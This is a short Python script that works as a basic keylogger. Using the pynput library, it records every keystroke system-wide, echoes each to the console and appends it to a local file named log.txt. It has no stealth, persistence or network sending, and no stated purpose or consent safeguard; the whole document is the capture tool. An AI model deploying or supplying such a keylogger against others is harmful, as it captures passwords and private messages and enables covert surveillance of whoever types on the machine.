from pynput.keyboard import Key, Listener

def on_press(key):

    f = open('./log.txt', 'a')

    if type(key) is not type(Key.space):
        print(key.char)
        f.write(key.char)
    else:
        print(str(key))
        f.write('\n'+str(key)+'\n')

    f.close()

with Listener(on_press) as l:
    l.join()